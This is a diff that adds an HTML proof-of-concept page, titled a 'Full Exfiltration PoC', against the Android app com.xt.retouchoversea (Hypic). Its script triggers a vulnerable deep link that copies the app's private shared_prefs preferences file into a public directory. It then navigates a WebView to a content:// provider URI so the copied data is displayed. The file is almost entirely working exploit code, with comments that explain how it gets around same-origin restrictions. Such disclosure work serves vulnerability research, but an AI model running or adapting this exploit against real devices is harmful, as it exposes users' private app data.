@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypic Full Exfiltration PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        button { padding: 15px 20px; font-size: 16px; background: #34c759; color: white; border: none; border-radius: 5px; cursor: pointer; margin-bottom: 10px; display: block; width: 100%;}
+    </style>
+</head>
+<body>
+    <h1>Hypic LFD Exploit</h1>
+    
+    <button onclick="triggerLFD()">Step 1: Overwrite File (LFD)</button>
+    <button onclick="viewFile()" style="background: #007bff;">Step 2: View Stolen Data</button>
+
+    <script>
+        function triggerLFD() {
+            // Trigger the vulnerable deep link to copy the private preferences file 
+            // into the publicly accessible 'files/' directory
+            window.location.href = "retouchoversea://picture_edit?picture_path=file:///data/data/com.xt.retouchoversea/shared_prefs/com.xt.retouchoversea_preferences.xml";
+        }
+
+        function viewFile() {
+            // Because of Same-Origin Policy (CORS), an https:// page cannot use XMLHttpRequest 
+            // to read a content:// URI. However, we can instruct the WebView to navigate directly 
+            // to the content:// URI. The WebView will render the stolen XML file on the screen!
+            window.location.href = "content://com.xt.retouchoversea.provider/files_path/capcut_cover.jpeg";
+        }
+    </script>
+</body>
+</html>
